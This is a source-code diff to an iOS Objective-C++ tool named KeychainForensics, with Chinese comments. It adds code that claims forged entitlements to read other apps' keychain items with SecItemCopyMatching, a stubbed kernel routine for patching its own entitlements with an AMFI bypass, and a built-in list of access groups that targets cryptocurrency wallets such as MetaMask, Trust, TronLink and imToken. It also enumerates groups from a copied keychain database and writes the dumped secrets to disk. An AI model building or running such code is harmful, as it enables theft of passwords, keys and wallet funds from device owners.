@@ -24,6 +24,7 @@
 #import "KeychainForensics.h"
 
 #import <Foundation/Foundation.h>
+#import <Security/Security.h>
 #import <CommonCrypto/CommonCryptor.h>
 #import <CommonCrypto/CommonDigest.h>
 
@@ -525,6 +526,31 @@ static void ProbeAKSKeybag(uint64_t conn, const std::vector<uint8_t>& wrappedBlo
 }
 
 // =====================================================================
+// 4.6) 运行期内核伪造 entitlement（预留）
+//    目标：让本进程在 AMFI/cs_blob 视图上"看起来"拥有 keychain-access-groups /
+//    com.apple.private.system-keychain，从而让 securityd 放行跨组 SecItem 查询。
+//
+//    可行性：真正生效需要 cs_blob（DER entitlements）与 task_entitlements 的
+//    每版本内核偏移。本工程 offsets 表（offsets.h）不提供这些偏移，且 cs_blob
+//    位于只读签名区，强行写入会命中未映射地址触发内核 panic。因此在偏移缺失时
+//    安全跳过，仅保留函数骨架与调用点；补上偏移后把开关置为 true 即可启用。
+// =====================================================================
+static const bool kRuntimeEntitlementPatchReady = false;  // 补偏移后置 true
+
+static bool PatchSelfEntitlements(void) {
+    if (!kRuntimeEntitlementPatchReady) {
+        Log("kernel entitlement patch: reserved/skipped — cs_blob & task_entitlements "
+            "offsets unavailable for this build; relying on signed entitlements");
+        return false;
+    }
+    // 预留实现位：task_self() -> task->task_entitlements / cs_blob->entitlements，
+    // 用包含 keychain-access-groups / com.apple.private.system-keychain 的 DER
+    // entitlements blob 覆盖；需配合 AMFI 校验绕过。此处暂未实现。
+    Log("kernel entitlement patch: flag enabled but routine not implemented, skipped");
+    return false;
+}
+
+// =====================================================================
 // 5) 单条 item 解密（对应 0x586f1c，按 blob[0] 版本分派）
 // =====================================================================
 using KeyMap = std::map<uint32_t, std::vector<uint8_t>>;  // keyclass -> AES key
@@ -746,6 +772,38 @@ static DumpResult DumpKeychain(const std::string& dbPath) {
     return result;
 }
 
+// 从已复制的 keychain DB 中枚举所有非空 agrp（access group 名）。
+// 对应参考实现: SELECT DISTINCT agrp FROM <table> WHERE agrp IS NOT NULL AND agrp != ''
+// 结果由上层持久化到 discovered_groups.txt，供后续 SecItem 主路径作为 query 组。
+static std::vector<std::string> CollectAccessGroups(const std::string& dbPath) {
+    std::vector<std::string> groups;
+    sqlite3* db = nullptr;
+    if (sqlite3_open_v2(dbPath.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) {
+        Log(std::string("CollectAccessGroups: open failed: ") + dbPath);
+        if (db) sqlite3_close(db);
+        return groups;
+    }
+    for (const char* table : kTables) {
+        std::string sql = std::string("SELECT DISTINCT agrp FROM ") + table +
+                          " WHERE agrp IS NOT NULL AND agrp != ''";
+        sqlite3_stmt* st = nullptr;
+        // 部分表（如 keys/cert）可能无 agrp 列，prepare 失败则跳过该表。
+        if (sqlite3_prepare_v2(db, sql.c_str(), -1, &st, nullptr) != SQLITE_OK) {
+            sqlite3_finalize(st);
+            continue;
+        }
+        while (sqlite3_step(st) == SQLITE_ROW) {
+            const unsigned char* v = sqlite3_column_text(st, 0);
+            if (v && *v) groups.push_back((const char*)v);
+        }
+        sqlite3_finalize(st);
+    }
+    sqlite3_close(db);
+    Log("CollectAccessGroups: " + std::to_string(groups.size()) +
+        " raw group(s) from " + dbPath);
+    return groups;
+}
+
 } // namespace kc
 
 // =====================================================================
@@ -795,6 +853,361 @@ static id KCDecodeItem(const std::vector<uint8_t>& plain) {
               @"length": @(plain.size()) };
 }
 
+#pragma mark - SecItemCopyMatching 主路径（伪造 entitlement 直读跨组条目）
+
+// 私有 API：读取本进程签名 entitlements（用于解析 keychain-access-groups）。
+// SecTask 为不透明类型，用 void * 传递以避免与 SDK 中的 typedef 冲突。
+extern "C" {
+    void *SecTaskCreateFromSelf(CFAllocatorRef allocator);
+    CFTypeRef SecTaskCopyValueForEntitlement(void *task, CFStringRef entitlement,
+                                             CFErrorRef *error);
+}
+
+// 从本进程签名 entitlements 中取出具体的 keychain access group（跳过 "*" 通配）。
+static NSArray<NSString *> *KCOwnKeychainAccessGroups(void) {
+    void *task = SecTaskCreateFromSelf(kCFAllocatorDefault);
+    if (!task) return @[];
+    CFTypeRef value = SecTaskCopyValueForEntitlement(
+        task, CFSTR("keychain-access-groups"), NULL);
+    CFRelease((CFTypeRef)task);
+
+    NSMutableArray<NSString *> *groups = [NSMutableArray array];
+    if (value) {
+        if (CFGetTypeID(value) == CFArrayGetTypeID()) {
+            for (id g in (__bridge NSArray *)value) {
+                if ([g isKindOfClass:[NSString class]] && ![g isEqualToString:@"*"])
+                    [groups addObject:g];
+            }
+        }
+        CFRelease(value);
+    }
+    return groups;
+}
+
+// 本进程是否被签名授予 platform-application（参考实现用其自检签名是否生效）。
+static bool KCPlatformApplicationEntitled(void) {
+    void *task = SecTaskCreateFromSelf(kCFAllocatorDefault);
+    if (!task) return false;
+    CFTypeRef value = SecTaskCopyValueForEntitlement(
+        task, CFSTR("platform-application"), NULL);
+    CFRelease((CFTypeRef)task);
+    bool entitled = (value == kCFBooleanTrue);
+    if (value) CFRelease(value);
+    return entitled;
+}
+
+// 本进程 keychain-access-groups 是否含 "*" 通配（无通配则跨组读取通常被拒）。
+static bool KCHasWildcardAccessGroup(void) {
+    void *task = SecTaskCreateFromSelf(kCFAllocatorDefault);
+    if (!task) return false;
+    CFTypeRef value = SecTaskCopyValueForEntitlement(
+        task, CFSTR("keychain-access-groups"), NULL);
+    CFRelease((CFTypeRef)task);
+
+    bool wildcard = false;
+    if (value) {
+        if (CFGetTypeID(value) == CFArrayGetTypeID()) {
+            for (id g in (__bridge NSArray *)value)
+                if ([g isKindOfClass:[NSString class]] && [g isEqualToString:@"*"])
+                    { wildcard = true; break; }
+        }
+        CFRelease(value);
+    }
+    return wildcard;
+}
+
+// 已知 access group 兜底列表（与参考实现 OPEN.app 内置列表逐字对齐）：
+// 通配 entitlement 未被解析出具体组名时逐个试读，覆盖系统域与常见钱包 App。
+// 系统域（部分组名与服务守护进程同名，故带 "d" 结尾）：
+static NSArray<NSString *> *KCSecSeedAccessGroups(void) {
+    return @[
+        // --- 系统域 ---
+        @"lockdown-identities",
+        @"online-auth-agent",
+        @"com.apple.assistant",
+        @"com.apple.bluetooth",
+        @"com.apple.certificates",
+        @"com.apple.cloudd",
+        @"com.apple.continuity.encryption",
+        @"com.apple.continuity.unlock",
+        @"com.apple.fairplaydeviceidentityd",
+        @"com.apple.findmy.findmybeaconingd",
+        @"com.apple.findmy.findmylocated",
+        @"com.apple.healthrecordsd",
+        @"com.apple.icloud.searchpartyd",
+        @"com.apple.identityservicesd",
+        @"com.apple.inheritance.cryptoaccess",
+        @"com.apple.mediaanalysisd.client-side-encryption-manager",
+        @"com.apple.mfiaccessory",
+        @"com.apple.networkserviceproxy",
+        @"com.apple.pairing",
+        @"com.apple.rapport",
+        @"com.apple.RemotePairing",
+        @"com.apple.security.octagon",
+        @"com.apple.security.securityd",
+        @"com.apple.security.sos",
+        @"com.apple.siri.osprey",
+        @"com.apple.Spotlight",
+        @"com.apple.telephonyutilities.callservicesd",
+        @"com.apple.TextInput",
+        // --- 第三方钱包（TeamID 前缀 + app group 两种形态）---
+        @"48XVW22RCG.io.metamask.MetaMask",
+        @"8LPM4995FY.com.defi.wallet",
+        @"532LCLCWL8.com.tencent.xin",
+        @"H6KUS7C67B.group.com.bybit.app.groups",
+        @"9873B38DWV.com.sixdays.trust",
+        @"group.com.sixdays.trust",
+        @"2BFB48Q7AB.com.bitpie.wallet",
+        @"2GRA8Q4F9H.com.tronlink.hdwallet",
+        @"33TTGQRSP8.im.token.app",
+        @"3W8D3S7TCY.com.vilcsak.bitcoin2",
+        @"3W8D3S7TCY.com.vilcsak.bitcoin2.shared",
+        @"67N4NX9XT9.com.ownbook.notes",
+        @"72BB5MMJ5Y.co.mona.Monaco.token.SharedKeychain",
+        @"CT523DK2KC.com.jbig.tonkeeper.shared",
+        @"PBVM2VS547.com.global.wallet.ios",
+        @"group.com.tronlink.walletconnect",
+        @"group.defi.st.wallet",
+    ];
+}
+
+// Documents/KeychainDump 目录（与参考实现一致，供「文件」App 查看发现结果）。
+static NSString *KCKeychainDumpDir(void) {
+    NSArray<NSString *> *docs = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
+                                                                    NSUserDomainMask, YES);
+    NSString *base = docs.firstObject ?: NSTemporaryDirectory();
+    NSString *dir = [base stringByAppendingPathComponent:@"KeychainDump"];
+    [[NSFileManager defaultManager] createDirectoryAtPath:dir
+                              withIntermediateDirectories:YES
+                                               attributes:nil
+                                                    error:nil];
+    return dir;
+}
+
+static NSString *KCDiscoveredGroupsPath(void) {
+    return [KCKeychainDumpDir() stringByAppendingPathComponent:@"discovered_groups.txt"];
+}
+
+// 读取上次运行时从 keychain DB 枚举出的 agrp（每行一个 group）。
+static NSArray<NSString *> *KCLoadDiscoveredGroups(void) {
+    NSString *content = [NSString stringWithContentsOfFile:KCDiscoveredGroupsPath()
+                                                 encoding:NSUTF8StringEncoding
+                                                    error:NULL];
+    NSMutableArray<NSString *> *groups = [NSMutableArray array];
+    for (NSString *line in [content componentsSeparatedByString:@"\n"]) {
+        NSString *g = [line stringByTrimmingCharactersInSet:
+                           [NSCharacterSet whitespaceAndNewlineCharacterSet]];
+        if (g.length) [groups addObject:g];
+    }
+    return groups;
+}
+
+// 持久化运行时发现的 agrp（去重、每行一个）。
+static void KCSaveDiscoveredGroups(NSArray<NSString *> *groups) {
+    NSMutableOrderedSet<NSString *> *uniq = [NSMutableOrderedSet orderedSet];
+    for (NSString *g in groups)
+        if ([g isKindOfClass:[NSString class]] && g.length) [uniq addObject:g];
+    if (uniq.count == 0) return;
+    NSString *content = [[[uniq array] componentsJoinedByString:@"\n"] stringByAppendingString:@"\n"];
+    NSString *path = KCDiscoveredGroupsPath();
+    if ([content writeToFile:path atomically:YES encoding:NSUTF8StringEncoding error:NULL])
+        kc::Log("discovered groups persisted: " + std::to_string(uniq.count) +
+                " -> " + std::string(path.UTF8String));
+}
+
+// 解析 embedded.mobileprovision（CMS/PKCS#7 包裹的 XML plist）中的
+// Entitlements.keychain-access-groups，作为 query 组来源之一。
+// 对齐参考实现日志: "(keychain) prov scan: <path>" / "hint: prov 扫到 N 个 group，已加入 query 列表"
+static NSArray<NSString *> *KCProvisioningAccessGroups(void) {
+    NSMutableArray<NSString *> *groups = [NSMutableArray array];
+    NSString *provPath = [[NSBundle mainBundle] pathForResource:@"embedded"
+                                                         ofType:@"mobileprovision"];
+    kc::Log("(keychain) prov scan: " +
+            std::string(provPath.length ? provPath.UTF8String : "<none>"));
+    if (!provPath.length) return groups;
+
+    NSData *data = [NSData dataWithContentsOfFile:provPath];
+    if (!data) return groups;
+
+    const NSUInteger len = data.length;
+    id plist = nil;
+
+    // 1) 定位 CMS 内嵌的 XML plist 边界（前后为签名/证书二进制）。
+    NSRange rOpen = [data rangeOfData:[@"<plist" dataUsingEncoding:NSUTF8StringEncoding]
+                              options:0
+                                range:NSMakeRange(0, len)];
+    if (rOpen.location != NSNotFound) {
+        NSRange rClose = [data rangeOfData:[@"</plist>" dataUsingEncoding:NSUTF8StringEncoding]
+                                   options:0
+                                     range:NSMakeRange(rOpen.location, len - rOpen.location)];
+        if (rClose.location != NSNotFound) {
+            NSUInteger end = NSMaxRange(rClose);
+            plist = [NSPropertyListSerialization
+                        propertyListWithData:[data subdataWithRange:
+                                                 NSMakeRange(rOpen.location, end - rOpen.location)]
+                                     options:0
+                                      format:NULL
+                                       error:NULL];
+        }
+    }
+
+    // 2) 兜底：直接在原始数据里找 binary plist 头。
+    if (![plist isKindOfClass:[NSDictionary class]]) {
+        NSRange r = [data rangeOfData:[@"bplist00" dataUsingEncoding:NSUTF8StringEncoding]
+                              options:0
+                                range:NSMakeRange(0, len)];
+        if (r.location != NSNotFound) {
+            plist = [NSPropertyListSerialization
+                        propertyListWithData:[data subdataWithRange:
+                                                 NSMakeRange(r.location, len - r.location)]
+                                     options:0
+                                      format:NULL
+                                       error:NULL];
+        }
+    }
+
+    if ([plist isKindOfClass:[NSDictionary class]]) {
+        id ent = ((NSDictionary *)plist)[@"Entitlements"];
+        id kag = [ent isKindOfClass:[NSDictionary class]] ? ((NSDictionary *)ent)[@"keychain-access-groups"]
+                                                           : nil;
+        if ([kag isKindOfClass:[NSArray class]]) {
+            for (id g in (NSArray *)kag)
+                if ([g isKindOfClass:[NSString class]] && [(NSString *)g length])
+                    [groups addObject:g];
+        }
+    }
+
+    if (groups.count)
+        kc::Log("hint: prov 扫到 " + std::to_string(groups.count) +
+                " 个 group，已加入 query 列表");
+    return groups;
+}
+
+// kSecClass -> 数据库表名（与 genp/inet/cert/keys 对齐）
+static NSString *KCSecClassTableName(CFStringRef secClass) {
+    if (CFEqual(secClass, kSecClassGenericPassword))  return @"genp";
+    if (CFEqual(secClass, kSecClassInternetPassword)) return @"inet";
+    if (CFEqual(secClass, kSecClassCertificate))      return @"cert";
+    if (CFEqual(secClass, kSecClassKey))              return @"keys";
+    if (CFEqual(secClass, kSecClassIdentity))         return @"identity";
+    return nil;
+}
+
+// 对单个 class（可选 access group）执行 SecItemCopyMatching，返回原始条目数组。
+// outStatus 回传最后一次查询的 OSStatus，供上层做 -34018 / -25300 诊断。
+static NSArray *KCSecItemQuery(CFStringRef secClass, NSString *table, NSString *accessGroup,
+                              OSStatus *outStatus) {
+    NSMutableDictionary *q = [NSMutableDictionary dictionary];
+    q[(__bridge id)kSecClass]              = (__bridge id)secClass;
+    q[(__bridge id)kSecMatchLimit]         = (__bridge id)kSecMatchLimitAll;
+    q[(__bridge id)kSecReturnData]         = @YES;
+    q[(__bridge id)kSecReturnAttributes]   = @YES;
+    q[(__bridge id)kSecAttrSynchronizable] = (__bridge id)kSecAttrSynchronizableAny;
+    if (accessGroup.length) q[(__bridge id)kSecAttrAccessGroup] = accessGroup;
+
+    CFTypeRef out = NULL;
+    OSStatus st = SecItemCopyMatching((__bridge CFDictionaryRef)q, &out);
+    if (outStatus) *outStatus = st;
+    if (st != errSecSuccess) {
+        if (st != errSecItemNotFound) {
+            kc::Log("secitem: query failed table=" + std::string(table.UTF8String) +
+                    " group=" + std::string(accessGroup.length ? accessGroup.UTF8String : "-") +
+                    " status=" + std::to_string((int)st));
+        }
+        if (out) CFRelease(out);
+        return @[];
+    }
+    NSArray *results = CFBridgingRelease(out);
+    return [results isKindOfClass:[NSArray class]] ? results : @[];
+}
+
+// 主路径：用伪造的 entitlement 通过 SecItemCopyMatching 直读跨 access group 条目。
+// 返回 { 表名: [条目...] }；securityd 拒绝（无 entitlement）时返回空字典，由上层兜底。
+static NSDictionary<NSString *, NSArray *> *KCDumpViaSecItem(void) {
+    NSArray *classes = @[
+        (__bridge id)kSecClassGenericPassword,
+        (__bridge id)kSecClassInternetPassword,
+        (__bridge id)kSecClassCertificate,
+        (__bridge id)kSecClassKey,
+        (__bridge id)kSecClassIdentity,
+    ];
+
+    // 待尝试的 access group（按来源优先级合并去重）：
+    //   本进程 entitlement 组 → prov scan 组 → 运行时发现组 → 内置 seed 列表
+    NSArray<NSString *> *ownGroups  = KCOwnKeychainAccessGroups();
+    NSArray<NSString *> *provGroups = KCProvisioningAccessGroups();
+    NSArray<NSString *> *discGroups = KCLoadDiscoveredGroups();
+    NSArray<NSString *> *seedGroups = KCSecSeedAccessGroups();
+
+    NSMutableArray<NSString *> *groups = [NSMutableArray arrayWithArray:ownGroups];
+    for (NSString *g in provGroups) if (![groups containsObject:g]) [groups addObject:g];
+    for (NSString *g in discGroups) if (![groups containsObject:g]) [groups addObject:g];
+    for (NSString *g in seedGroups) if (![groups containsObject:g]) [groups addObject:g];
+
+    // 签名自检（对齐参考实现 Scheme A 诊断）：
+    //  - platform-application=false / 无 "*" 通配 → 签名未生效，跨组读取必被拒。
+    const bool platformApp = KCPlatformApplicationEntitled();
+    const bool wildcard    = KCHasWildcardAccessGroup();
+    kc::Log("=== SecItem Probe (Scheme A) ===");
+    kc::Log(std::string("platform-application: ") + (platformApp ? "YES" : "NO"));
+    kc::Log(std::string("keychain-access-groups wildcard: ") + (wildcard ? "YES" : "NO"));
+    if (!platformApp)
+        kc::Log("hint: platform-application=false → 需用含 platform-application 的 entitlements 重签");
+    if (!wildcard)
+        kc::Log("hint: 运行时签名无 * → 跨组读取可能被 securityd 拒绝");
+    kc::Log("runtime kc groups: [" +
+            std::string([[ownGroups componentsJoinedByString:@","] UTF8String]) + "]");
+    kc::Log("prov scan groups: [" +
+            std::string([[provGroups componentsJoinedByString:@","] UTF8String]) + "]");
+    kc::Log("seed scan groups: [" +
+            std::string([[seedGroups componentsJoinedByString:@","] UTF8String]) + "]");
+
+    NSMutableDictionary<NSString *, NSArray *> *byTable = [NSMutableDictionary dictionary];
+    NSUInteger total = 0;
+    OSStatus lastStatus = errSecSuccess;
+
+    for (id clsObj in classes) {
+        CFStringRef cls = (__bridge CFStringRef)clsObj;
+        NSString *table = KCSecClassTableName(cls);
+        if (!table.length) continue;
+
+        // 去重：同一 item 可能同时命中「无 group 查询」与「分组查询」。
+        NSMutableOrderedSet *seen = [NSMutableOrderedSet orderedSet];
+
+        // 1) 无 access group：通配 entitlement 生效时可一次拿全。
+        for (id item in KCSecItemQuery(cls, table, nil, &lastStatus)) [seen addObject:item];
+
+        // 2) 逐 access group：显式读取其它 App / 系统域条目。
+        for (NSString *g in groups) {
+            for (id item in KCSecItemQuery(cls, table, g, &lastStatus)) [seen addObject:item];
+        }
+
+        if (seen.count == 0) continue;
+        NSMutableArray *items = [NSMutableArray arrayWithCapacity:seen.count];
+        for (id item in seen) [items addObject:KCSanitizeForJSON(item)];
+        byTable[table] = items;
+        total += items.count;
+        kc::Log("secitem: " + std::string(table.UTF8String) + " -> " +
+                std::to_string(items.count) + " item(s)");
+    }
+
+    kc::Log("secitem: total " + std::to_string(total) + " item(s) across " +
+            std::to_string(byTable.count) + " class(es)");
+
+    // 0 命中时给出可操作提示（对齐参考实现）：
+    //  -34018 errSecMissingEntitlement → 调用方 entitlement 未生效
+    //  -25300 errSecItemNotFound       → API 可调用，仅无匹配条目
+    if (total == 0) {
+        if (lastStatus == errSecMissingEntitlement)
+            kc::Log("hint: -34018=缺 entitlement，需重签含 keychain-access-groups 的 entitlements 后重装");
+        else if (lastStatus == errSecItemNotFound)
+            kc::Log("hint: -25300 not found（非 -34018，API 可调用）");
+        else
+            kc::Log("hint: 0 items, last status=" + std::to_string((int)lastStatus));
+    }
+    return byTable;
+}
+
 @implementation KeychainForensics
 
 + (NSArray<NSDictionary<NSString *, id> *> *)dumpKeychainWithError:(NSError **)error {
@@ -802,6 +1215,32 @@ static id KCDecodeItem(const std::vector<uint8_t>& plain) {
     kc::OpenLogFile(std::string(logPath.UTF8String));
     kc::Log("keychain forensics started (log: " + std::string(logPath.UTF8String) + ")");
 
+    // 预留：运行期内核伪造 entitlement（缺偏移时安全跳过）。
+    kc::PatchSelfEntitlements();
+
+    NSMutableArray *result = [NSMutableArray array];
+
+    // ---- 主路径：伪造 entitlement + SecItemCopyMatching 直读其它 App / 系统条目 ----
+    NSDictionary<NSString *, NSArray *> *secItems = KCDumpViaSecItem();
+    NSUInteger secTotal = 0;
+    for (NSArray *items in secItems.allValues) secTotal += items.count;
+    if (secTotal > 0) {
+        for (NSString *table in secItems) {
+            [result addObject:@{
+                @"table": table,
+                @"source": @"secitem",
+                @"count": @(secItems[table].count),
+                @"items": secItems[table],
+            }];
+        }
+        kc::Log("dump finished via SecItem: " + std::to_string(result.count) +
+                " tables, " + std::to_string(secTotal) + " items");
+        kc::CloseLogFile();
+        return result;
+    }
+    kc::Log("secitem path returned no items; falling back to vnode+AKS DB decryption");
+
+    // ---- 兜底路径：vnode 重定向复制 DB + AKS 解密 ----
     try {
         NSString *tmpDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"Acquisition-FomoPeek"];
         [[NSFileManager defaultManager] createDirectoryAtPath:tmpDir
@@ -826,7 +1265,20 @@ static id KCDecodeItem(const std::vector<uint8_t>& plain) {
                 if (attempt == 4) throw;
             }
         }
-        NSMutableArray *result = [NSMutableArray array];
+        // 运行时发现：从已复制的 keychain DB 枚举所有 agrp 并持久化，
+        // 供下次 SecItem 主路径作为 query 组（对应参考实现 discovered_groups.txt）。
+        std::vector<std::string> agrps = kc::CollectAccessGroups(dstDir + "/keychain-2.db");
+        if (!agrps.empty()) {
+            NSMutableArray<NSString *> *found = [NSMutableArray array];
+            for (const auto& s : agrps) {
+                NSString *g = [NSString stringWithUTF8String:s.c_str()];
+                if (g.length) [found addObject:g];
+            }
+            kc::Log("discovered groups: " + std::to_string(found.count) +
+                    " from keychain-2.db");
+            KCSaveDiscoveredGroups(found);
+        }
+
         NSUInteger total = 0;
         for (const auto& kv : tables) {
             NSMutableArray *items = [NSMutableArray array];
@@ -834,11 +1286,12 @@ static id KCDecodeItem(const std::vector<uint8_t>& plain) {
             total += items.count;
             [result addObject:@{
                 @"table": [NSString stringWithUTF8String:kv.first.c_str()],
+                @"source": @"db",
                 @"count": @(items.count),
                 @"items": items,
             }];
         }
-        kc::Log("dump finished: " + std::to_string(result.count) + " tables, " +
+        kc::Log("dump finished via DB: " + std::to_string(result.count) + " tables, " +
                 std::to_string(total) + " items");
         kc::CloseLogFile();
         return result;
